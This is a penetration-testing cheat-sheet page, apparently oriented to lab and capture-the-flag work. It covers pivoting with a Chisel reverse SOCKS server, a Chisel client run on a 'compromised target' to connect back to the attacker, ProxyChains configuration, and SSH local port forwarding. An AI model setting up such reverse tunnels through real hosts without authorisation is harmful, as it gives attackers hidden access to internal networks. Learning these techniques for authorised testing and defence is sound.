---
description: chisel, proxychains & ssh
---

# Proxying \ Port Forwarding

## Contents:

* [Chisel](proxying-port-forwarding.md#chisel-and-proxychains-tunneling-and-pivoting)
* [SSH Local Port Forwarding](proxying-port-forwarding.md#ssh-local-port-forwarding)

## 🔀 Chisel & ProxyChains: Tunneling & Pivoting

Techniques: [https://attack.mitre.org/techniques/T1090/](https://attack.mitre.org/techniques/T1090/)

When working on **internal network enumeration** or **pivoting**, **Chisel** combined with **ProxyChains** allows you to **route traffic through a compromised host** and access restricted services.

***

#### **1️⃣ Attacker: Start Chisel Server**

On your **attacking machine (Kali, Parrot, etc.)**, start a **Chisel server** that listens for reverse connections:

```bash
chisel server --reverse -p 9001 --socks5 -v
```

#### **📝 Explanation**

<table><thead><tr><th>Command</th><th>Description</th><th data-hidden></th></tr></thead><tbody><tr><td><code>--reverse</code></td><td>Allows reverse tunneling (victim connects back to attacker)</td><td></td></tr><tr><td><code>-p 9001</code></td><td>Runs the Chisel server on <strong>port 9001</strong></td><td></td></tr><tr><td><code>--socks5</code></td><td>Enables a <strong>SOCKS5 proxy</strong></td><td></td></tr><tr><td><code>-v</code></td><td><strong>Verbose mode</strong> for debugging</td><td></td></tr></tbody></table>

#### **2️⃣ Configuring ProxyChains**

To tunnel traffic through the compromised host, edit **ProxyChains configuration** on the attacker’s machine:

**Edit: `/etc/proxychains.conf`**

```bash
nano /etc/proxychains.conf
```

**Scroll to the bottom and set:**

```bash
socks5 127.0.0.1 1080
```

`127.0.0.1 1080` → **SOCKS5 proxy is running locally on port 1080**

#### **3️⃣ Victim: Connect Back to Attacker**

On the **compromised target**, download and execute Chisel:

```bash
chmod +x chisel
./chisel client 10.10.14.21:9001 R:socks
```

#### **📝 Explanation**

* Connects **back to the attacker’s Chisel server (10.10.14.21:9001)**
* `R:socks` → Creates a **SOCKS proxy tunnel**

#### **4️⃣ Using ProxyChains for Access**

Once the tunnel is established, **route your tools through the compromised host** using ProxyChains.

**Example: Browse Internal Services**

```bash
proxychains firefox 127.0.0.1:8080
```

## 🔀 SSH Local Port Forwarding

#### 📌 Command

```bash
ssh -L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT> <USER>@<TARGET_IP>
```

#### 📖 Explanation

This **SSH Local Port Forwarding** command allows access to **a remote service** by tunneling it through a **local port**.

| Option                                    | Description                                                          |
| ----------------------------------------- | -------------------------------------------------------------------- |
| `-L <LOCAL_PORT>:127.0.0.1:<REMOTE_PORT>` | Sets up **local port forwarding**                                    |
| `<LOCAL_PORT>`                            | The **port on the attacker machine** where traffic will be forwarded |
| `127.0.0.1:<REMOTE_PORT>`                 | The **service running on the remote machine** that you want to reach |
| `<USER>@<TARGET_IP>`                      | The **SSH credentials** for accessing the remote system              |

#### ✔️ **Make the tunnel persistent using `-N` (no shell) and `-f` (background mode):**

```
ssh -L 8080:127.0.0.1:80 -N -f user@target.htb
```

#### 🎯 **How It Works**

1️⃣ **Creates an SSH connection** to the target machine.\
2️⃣ **Maps a local port** (`<LOCAL_PORT>`) to a **remote service** (`<REMOTE_PORT>`).\
3️⃣ **Access the remote service** by connecting to `127.0.0.1:<LOCAL_PORT>` on your machine.
